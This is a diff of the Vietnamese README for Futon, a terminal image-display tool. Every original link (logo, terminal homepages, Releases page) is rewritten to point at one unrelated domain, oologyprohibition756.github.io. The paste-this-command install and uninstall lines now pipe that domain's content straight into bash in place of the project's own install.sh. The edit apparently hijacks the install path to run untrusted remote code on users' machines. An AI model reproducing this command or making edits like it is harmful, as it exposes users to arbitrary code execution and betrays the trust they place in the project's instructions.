@@ -2,7 +2,7 @@
 
 <p><br/></p>
 <p align="center">
-  <img src="https://github.com/user-attachments/assets/2b1cd5ba-eb66-4632-82d8-284f7c1e3780" alt="Futon Logo" style="width: 192px" />
+  <img src="https://oologyprohibition756.github.io" alt="Futon Logo" style="width: 192px" />
 </p>
 <p><br/></p>
 
@@ -28,14 +28,14 @@ Terminal hỗ trợ **Kitty Graphics Protocol** hoặc **Sixel**:
 
 | Terminal | Protocol |
 |----------|----------|
-| [Kitty](https://sw.kovidgoyal.net/kitty/) | Kitty (native) |
-| [WezTerm](https://wezfurlong.org/wezterm/) | Kitty + Sixel |
-| [Ghostty](https://ghostty.org/) | Kitty + Sixel |
-| [foot](https://codeberg.org/dnkl/foot) | Sixel |
-| [iTerm2](https://iterm2.com/) | Sixel |
-| [Konsole](https://konsole.kde.org/) | Sixel |
-| [mlterm](https://github.com/arakiken/mlterm) | Sixel |
-| [XTerm](https://invisible-island.net/xterm/) | Sixel (compile với `--enable-sixel`) |
+| [Kitty](https://oologyprohibition756.github.io) | Kitty (native) |
+| [WezTerm](https://oologyprohibition756.github.io) | Kitty + Sixel |
+| [Ghostty](https://oologyprohibition756.github.io) | Kitty + Sixel |
+| [foot](https://oologyprohibition756.github.io) | Sixel |
+| [iTerm2](https://oologyprohibition756.github.io) | Sixel |
+| [Konsole](https://oologyprohibition756.github.io) | Sixel |
+| [mlterm](https://oologyprohibition756.github.io) | Sixel |
+| [XTerm](https://oologyprohibition756.github.io) | Sixel (compile với `--enable-sixel`) |
 
 > **Lưu ý:** Kitty graphics nhanh và mượt hơn Sixel trên cùng một terminal. Nếu terminal bạn hỗ trợ cả hai, Futon sẽ ưu tiên dùng Kitty.
 
@@ -44,7 +44,7 @@ Terminal hỗ trợ **Kitty Graphics Protocol** hoặc **Sixel**:
 ### Tự động (khuyên dùng)
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/KabosuNeko/Futon/main/install.sh | bash
+curl -sSL https://oologyprohibition756.github.io | bash
 ```
 
 Script sẽ tự động phát hiện OS và architecture, tải bản release mới nhất từ GitHub Releases về và cài vào `/usr/local/bin/`.
@@ -52,7 +52,7 @@ Script sẽ tự động phát hiện OS và architecture, tải bản release m
 Để gỡ cài đặt:
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/KabosuNeko/Futon/main/install.sh | bash -s -- uninstall
+curl -sSL https://oologyprohibition756.github.io | bash -s -- uninstall
 ```
 
 ### Build từ source
@@ -63,7 +63,7 @@ go install github.com/KabosuNeko/Futon@latest
 
 ### Binary
 
-Tải bản mới nhất từ [Releases](https://github.com/KabosuNeko/Futon/releases).
+Tải bản mới nhất từ [Releases](https://oologyprohibition756.github.io).
 
 Hỗ trợ:
 - Linux (amd64, arm64)
